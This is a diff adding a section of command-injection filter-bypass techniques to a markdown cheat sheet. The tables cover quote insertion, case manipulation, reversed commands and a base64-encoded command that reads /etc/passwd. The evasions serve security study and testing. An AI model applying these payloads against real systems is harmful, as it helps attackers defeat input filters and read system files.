@@ -34,3 +34,18 @@ Injection Operators
 |${LS_COLORS:10:1} 	|Will be replaced with ;|
 |$(tr '!-}' '"-~'<<<[) 	|Shift character by one ([ -> \)|
 
+### Blacklisted Command Bypass
+### Character Insertion 	
+|Code| 	Description|
+|:----|:----|
+|' or " 	|Total must be even|
+|$@ or \ 	|Linux only|
+### Case Manipulation 	
+|$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") |	Execute command regardless of cases|
+|$(a="WhOaMi";printf %s "${a,,}") 	|Another variation of the technique|
+### Reversed Commands 	
+|echo 'whoami' \| rev |	Reverse a string|
+|$(rev<<<'imaohw') 	|Execute reversed command|
+### Encoded Commands 	
+|echo -n 'cat /etc/passwd \| grep 33' \| base64 	|Encode a string with base64|
+|bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)| 	Execute b64 encoded string|
